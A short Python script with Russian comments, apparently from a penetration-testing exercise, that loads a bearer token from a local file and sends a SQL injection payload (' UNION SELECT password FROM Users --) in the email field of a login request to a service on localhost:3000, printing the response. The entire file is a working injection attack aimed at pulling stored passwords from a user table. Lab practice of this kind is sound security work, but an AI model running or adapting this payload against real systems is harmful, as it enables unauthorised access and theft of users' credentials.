#!/usr/bin/env python3
import requests
import json

# Загружаем токен из файла
with open("/home/alehandro/pentest/token.txt", "r") as f:
    user_token = f.read().strip()

headers = {
    "Authorization": f"Bearer {user_token}",
    "Content-Type": "application/json"
}

base_url = "http://localhost:3000"
login_url = f"{base_url}/rest/user/login"

# Пейлоад для UNION-атаки
payload = "' UNION SELECT password FROM Users --"

login_data = {
    "email": payload,
    "password": "test"
}

print("[*] Отправляю UNION-запрос...")
response = requests.post(login_url, json=login_data, headers=headers)

print(f"Статус: {response.status_code}")
print("Ответ:")
print(response.text[:500])
